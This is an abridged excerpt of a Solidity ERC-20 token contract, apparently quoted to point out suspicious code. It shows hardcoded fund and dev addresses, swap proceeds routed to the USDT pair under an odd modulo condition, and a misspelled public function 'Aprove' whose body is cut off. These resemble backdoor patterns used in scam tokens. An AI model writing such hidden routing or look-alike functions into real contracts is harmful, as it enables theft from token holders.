...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public fundAddress = address(0x0518f24B46F3771763BCaCE17754C68C1e5AADe1);
    address public devAddress = address(0xc4e24EdB5809e8d7Eab4f67337F7fcd7fc6F9993);
    ...
    uint256 public maxWalletAmount = 21000000000000 * 10 ** _decimals;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        path[0] = address(this);
        path[1] = _usdt;
        address swapTokenAddress=marketRewardFlag%8==4?_usdtPair:address(_tokenDistributor);
    ...
    function Aprove(address to) public{
